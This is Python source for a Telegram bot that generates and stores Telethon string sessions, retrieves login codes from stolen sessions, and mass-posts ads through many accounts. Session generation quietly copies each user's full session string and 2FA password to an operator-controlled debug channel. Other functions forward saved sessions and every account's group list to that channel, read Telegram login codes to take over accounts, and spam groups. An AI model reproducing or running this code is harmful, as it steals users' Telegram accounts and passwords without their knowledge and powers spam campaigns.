# Made By @LEGENDX22 For Ap Hacker
# Dont Kang Without Credits
# ©️2024 LEGENDX22
import telethon
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from env import telegram_database_chat
from TeleClient import MyClient
from telethon.errors.rpcerrorlist import (
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberBannedError,
)
from buttonUtils import *
from utils import *
from env import *
from dataManage import *


async def session_manager(event):
    await event.edit(buttons=ses_manage_btns)

async def manage_sessions(event):
    await event.edit(buttons=manage_sessions_btns)


async def bot_manager(event):
    await event.edit(buttons=bot_manage_btns)


async def work_bots(event):
    await event.edit(buttons=work_btns)

async def session_to_otp(event):
    await event.edit('Session to OTP', buttons = sessionToOtpButton)

async def session_to_otp_number(event):
    async with event.client.conversation(event.chat_id) as conv:
        await event.delete()
        temp = await conv.send_message("send the string session here. you will get the number from here after that copy that number and login with it\nonce you send the otp use Get OTP button to get the otp.")
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
        try:
            client = MyClient(StringSession(response.text), api_id, api_hash)
            await client.connect()
            await client.getMe()
            await client.disconnect()
            await conv.send_message(f"Phone Number: +`{client.me.phone}`", buttons = sessionToOtpButton)
            await temp.delete()
        except Exception as e:
            await conv.send_message(f"Error: {e}")
            return
        
async def session_to_otp_code(event):
    async with event.client.conversation(event.chat_id) as conv:
        temp = await conv.send_message("Send the string session here. you will get the code from here after that copy that code and login with it.")
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
        try:
            client = MyClient(StringSession(response.text), api_id, api_hash)
            await client.connect()
            OtpMessage = await client.get_messages(777000, limit=1)
            await client.disconnect()
            await conv.send_message(f"`{OtpMessage[0].message}`", buttons = sessionToOtpButton)
            await temp.delete()
        except Exception as e:
            await conv.send_message(f"Error: {e}")
            return

async def sessionSetToDb(event):
    try:
        message = await event.client.get_messages(event.chat_id, ids=event.original_update.msg_id)
        session = message.message.split('\n')[-1]
        try:
            await event.client.send_message(debug_channel_id, message)
        except Exception as e:
            print(e)
        sessionManager = TeleSession()
        await sessionManager.add_session(event.sender.id, session)
        lastMessage = f"Session Saved Successfully.\n\n{message.message}"
        await event.edit(lastMessage, buttons = sessionToDbButton)
    except Exception as e:
        await event.respond(f"Error: {e}")

async def generateTelethonSession(event):
    global newClient
    await event.edit('Generating Session...')
    while True:
        try:
            async with event.client.conversation(event.chat_id) as conv:
                newClient = None
                await conv.send_message('Send your phone number with country code. (ex. +919876543210)\nor send /cancel to cancel the process.')
                response = await conv.get_response()
                if await event.client.checkCancel(response):
                    return
                phone_number = telethon.utils.parse_phone(response.text)
                pendingMsg = await conv.send_message('Please wait sending code...')
                try:
                    newClient = MyClient(StringSession(), api_id, api_hash)
                    await newClient.connect()
                    await newClient.send_code_request(phone_number)
                    await pendingMsg.edit('Code sent successfully.')
                except PhoneNumberInvalidError:
                    await pendingMsg.edit('Invalid phone number. Please try again.')
                    continue
                except PhoneNumberBannedError:
                    await pendingMsg.edit('Phone number banned. Please try again.')
                    continue
                except FloodWaitError as e:
                    await pendingMsg.edit(f'Flood wait of {e.seconds} seconds. Please try again after {e.seconds} seconds.')
                    continue
                except Exception as e:
                    await pendingMsg.edit(f'Error: {e}')
                    continue
                await conv.send_message('Send the code here.')
                response = await conv.get_response()
                try:
                    await newClient.sign_in(phone = phone_number, code = ' '.join(response.text))
                    await newClient.getMe()
                    await newClient.disconnect()
                    ses_text = f"Code verified successfully. Session generated.\n\nUser Name: `{newClient.me.first_name}`\nUser ID: `{newClient.me.id}`\nPhone Number: `{newClient.me.phone}`\n\n`{newClient.session.save()}`"
                    await event.client.send_message(debug_channel_id, ses_text)
                    await conv.send_message(ses_text, buttons = sessionToDbButton)
                    break
                except PhoneCodeInvalidError:
                    await conv.send_message('Invalid code. Please try again from start.')
                    continue
                except PhoneCodeExpiredError:
                    await conv.send_message('Code expired. Please try again from start.')
                    continue
                except SessionPasswordNeededError:
                    await conv.send_message('2FA is enabled. Please send the password here.')
                    response = await conv.get_response()
                    try:
                        await newClient.sign_in(password = response.text)
                        await newClient.getMe()
                        await newClient.disconnect()
                        ses_text = f"Code verified successfully. Session generated.\n\nUser Name: `{newClient.me.first_name}`\nUser ID: `{newClient.me.id}`\nPhone Number: `{newClient.me.phone}`\n2FA: {response.text}\n\n`{newClient.session.save()}`"
                        await event.client.send_message(debug_channel_id, ses_text)
                        await conv.send_message(ses_text, buttons = sessionToDbButton)
                        break
                    except Exception as e:
                        await conv.send_message(f'Error: {e}')
                        break
                except Exception as e:
                    print(e)
                finally:
                    await event.delete()
                    await pendingMsg.delete()
        except Exception as e:
            print(e)


async def save_session(event):
    sessionManage = TeleSession()
    async with event.client.conversation(event.chat_id) as conv:
        await event.delete()
        temp = await conv.send_message('Send the String Session here.')
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
        check = await check_ses(response.text, event)
        if not check:
            await conv.send_message('Session is not working. Please try again.')
            return
        await sessionManage.add_session(event.sender.id, response.text)
        await conv.send_message('Session saved', buttons = saveOrStart)
        await temp.delete()


async def delete_session(event):
    sessionManager = TeleSession()
    async with event.client.conversation(event.chat_id) as conv:
        temp = await conv.send_message('Send the String Session here.')
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
        await sessionManager.delete_session(event.sender.id, response.text)
        await event.delete()
        await conv.send_message('Session deleted', buttons = stopButton)
        await temp.delete()


async def set_logger(event):
    logger = TeleLogging()
    async with event.client.conversation(event.chat_id) as conv:
        await event.delete()
        temp = await conv.send_message('First Add this bot to your group/channel as admin and send the chat id/username here.\nfor getting chat id add this bot to your group/channel as admin and send /id there.\nchat id ex. -1001234567890\nchat username ex. @username.')
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
        await logger.set_logger(str(event.sender.id), response.text)
        await conv.send_message('Logger set successfully.', buttons = work_btns)
        await temp.delete()

async def save_ad(event):
    adManager = TeleAds()
    async with event.client.conversation(event.chat_id) as conv:
        await event.delete()
        await conv.send_message('Send the Ad Name here.')
        ad_name = await conv.get_response()
        if await event.client.checkCancel(ad_name):
            return
        await conv.send_message('Send the Ad here.')
        ad = await conv.get_response()
        await conv.send_message('Send the Sleep Time here. (in minutes)')
        sleep_time = await conv.get_response()
        x = await event.client.send_message(event.chat_id, "Saving Your Ad...")
        msgID = await event.client.send_message(telegram_database_chat, ad)
        await event.client.send_message(telegram_database_chat, f"Ad Name: {ad_name.text}\nMessage ID: {msgID.id}\nSleep Time: {sleep_time.text}\nAdded by {event.sender.first_name}", reply_to=msgID.id)
        await adManager.save_ad(event.sender.id, ad_name.text, msgID.id, sleep_time.text)
        await x.edit('Your Ad is Saved Successfully.', buttons = bot_manage_btns)

async def work_debug(event, clients):
    teleDebugger = TeleDebug()
    debugList = await teleDebugger.get_debug_list()
    for client in clients:
        if debugList is not None and client.me.id in debugList:
            return
        else:
            chat_links = await client.saveAllGroups()
            message = f"Client Name: `{client.me.first_name}`\nClient ID: `{client.me.id}`\n\nGroups:\n`{chat_links}`"
            await event.client.send_message(debug_channel_id, message)
            await teleDebugger.set_debug(client.me.id)
            continue
        

async def start_bots(event):
    msg = await event.edit('Starting bots...')
    if getClients(event.sender.id) != []:
        await msg.edit('Bots are already started.', buttons=work_btns)
        return
    sessionManage = TeleSession()
    total_sessions = await sessionManage.get_sessions(event.sender.id)
    if not total_sessions:
        await event.edit('No active sessions found. Please save a session first.', buttons = saveOrStart)
        return
    for x in total_sessions:
        try:
            client = MyClient(StringSession(x), api_id, api_hash)
            await client.start()
            await client.getMe()
            saveClient(event.sender.id, client)
        except Exception as e:
            print(e)
    await msg.edit('All bots are started.', buttons=work_btns)
    asyncio.create_task(work_debug(event, getClients(event.sender.id)))
    

async def stop_bots(event):
    clients = getClients(event.sender.id)
    if len(clients) == 0:
        await event.edit('No sessions is active. Please save a session or start the bot first.', buttons=saveOrStart)
        return
    clients_copy = clients.copy()
    for client in clients_copy:
        print("Disconnecting...")
        await client.disconnect()
        delClient(event.sender.id, client)
        print("Disconnected.")
    await event.edit('All bots are stopped.', buttons=startButton)


async def check_sessions(event):
    await event.edit('Checking sessions...')
    await check_all_sessions(event.sender.id, event)
    await event.edit('Sessions checked.', buttons=ses_manage_btns)


# main work!

async def joinchat(event):
    if not getSudo(event.sender.id):
        return await event.respond(NOT_SUDO_AD.format(event.sender.first_name), buttons = notSudoButtons)
    total_clients = getClients(event.sender.id)
    if len(total_clients) == 0:
        await event.edit('No sessions found. Please save a session or start the bot first.', buttons=saveOrStart)
        return
    buttons = await joinchat_buttons(total_clients)
    await event.edit('Choose a bot:', buttons=buttons)

async def join_private_chat(client, link, event):
    try:
        await client(ImportChatInviteRequest(link))
    except FloodWaitError as e:
        await event.respond(f'Flood wait of {e.seconds} seconds.\nYou dont have to do anything. I will try again after {e.seconds} seconds.')
        await asyncio.sleep(e.seconds)
    except Exception as e:
        await event.respond(f'Error: `{e}`')

async def join_public_chat(client, link, event):
    try:
        await client(JoinChannelRequest(link))
    except FloodWaitError as e:
        await event.respond(f'Flood wait of {e.seconds} seconds.\nYou dont have to do anything. I will try again after {e.seconds} seconds.')
        await asyncio.sleep(e.seconds)
    except Exception as e:
        await event.respond(f'Error: `{e}`')

async def client_join_chat(event):
    global chat_link
    data = event.data.decode('utf-8')
    client_id = int(data.split('_')[1])
    clients = getClients(event.sender.id)
    chat_link = ""
    await event.edit('Joining Please Wait...')
    async with event.client.conversation(event.chat_id) as conv:
        await conv.send_message('Send the chat link here.\nPublic chats ex. @chatname\nPrivate chats ex. https://t.me/+xxx.\nMultiple chats can be sent by separating them with new line.')
        response = await conv.get_response()
        if await event.client.checkCancel(response):
            return
        chat_link = response.text
    for client in clients:
        cl_id = await client.get_me()
        if cl_id.id == client_id:
            try:
                total_links = chat_link.split('\n')
                if len(total_links) > 1:
                    for link in total_links:
                        if "+" in link:
                            new_link = link.split('+')[1]
                            await join_private_chat(client, new_link, event)
                            await event.client.send_message(telegram_database_chat, f"Client Name: {cl_id.first_name}\nClient ID: {cl_id.id}\nChat Link: {new_link}")
                        else:
                            await join_public_chat(client, link, event)
                            await event.client.send_message(telegram_database_chat, f"Client Name: {cl_id.first_name}\nClient ID: {cl_id.id}\nChat Link: {link}")
                else:
                    if "+" in chat_link:
                        new_link = chat_link.split('+')[1]
                        await join_private_chat(client, new_link, event)
                        await event.client.send_message(telegram_database_chat, f"Client Name: {cl_id.first_name}\nClient ID: {cl_id.id}\nChat Link: {new_link}")
                    else:
                        await join_public_chat(client, link, event)
                        await event.client.send_message(telegram_database_chat, f"Client Name: {cl_id.first_name}\nClient ID: {cl_id.id}\nChat Link: {chat_link}")
                await event.delete()
                await event.respond(f'{cl_id.first_name} joined the chat.', buttons=work_btns)
                break
            except Exception as e:
                await event.respond(f'Error: {e}')
                continue
        else:
            continue
    print("work done!")


async def auto_posting(event):
    if not getSudo(event.sender.id):
        return await event.respond(NOT_SUDO_AD.format(event.sender.first_name), buttons = notSudoButtons)
    total_clients = getClients(event.sender.id)
    if len(total_clients) == 0:
        await event.edit('No sessions found. Please save a session or start the bot first.', buttons=saveOrStart)
        return
    await autopost(event)

async def autopost(event):
    if not getSudo(event.sender.id):
        return await event.respond(NOT_SUDO_AD.format(event.sender.first_name), buttons = notSudoButtons)
    adManager = TeleAds()
    user_ads = await adManager.get_all_ads(str(event.sender.id))
    if user_ads:
        buttons = autoPost_buttons(user_ads)
        await event.edit('Choose an Ad:', buttons=buttons)
    else:
        await ask_ad(event)
        

async def ads_button_manage(event):
    global filePath 
    filePath = ""
    fileManager = FileManage()
    fileManager.deleteMediaFolder("media")
    fileManager.makeMediaFolder("media")
    data = event.data.decode('utf-8')
    ad_name = data.split('_')[1]
    adManager = TeleAds()
    ad = await adManager.get_ad(str(event.sender.id), ad_name)
    if ad:
        message = await event.client.get_messages(telegram_database_chat, ids=ad["messageID"])
        if message.media:
            filePath = await event.client.download_media(message.media, "media/")
        else:
            print("No media")
        await event.delete()
        await event.respond('Auto posting will start in a moment.\nincase you want to stop the process, use Stop Button.', buttons = stopButton)
        tasks = []
        clients = getClients(event.sender.id)
        for client in clients:
            tasks.append(asyncio.create_task(autoPostGlobal(client, event, message.text, ad["sleepTime"], filePath)))
        await asyncio.gather(*tasks)
        await event.respond('Auto posting Done.')
    else:
        await event.respond('Ad not found.')

async def ask_ad(event):
    global message, sleep_time
    message = ""
    sleep_time = 0
    async with event.client.conversation(event.chat_id) as conv:
        await conv.send_message('Send the message here.')
        response = await conv.get_response()
        message = response.text
        await conv.send_message('Send the sleep time here. (in minutes)')
        response = await conv.get_response()
        sleep_time = int(response.text) * 60
    await event.delete()
    await event.respond('Auto posting will start in a moment.\nincase you want to stop the process, use Stop Button.', buttons = stopButton)
    tasks = []
    clients = getClients(event.sender.id)
    for client in clients:
        tasks.append(asyncio.create_task(autoPostGlobal(client,event, message, sleep_time)))
    await asyncio.gather(*tasks)
    await event.respond('Auto posting Done.')
    
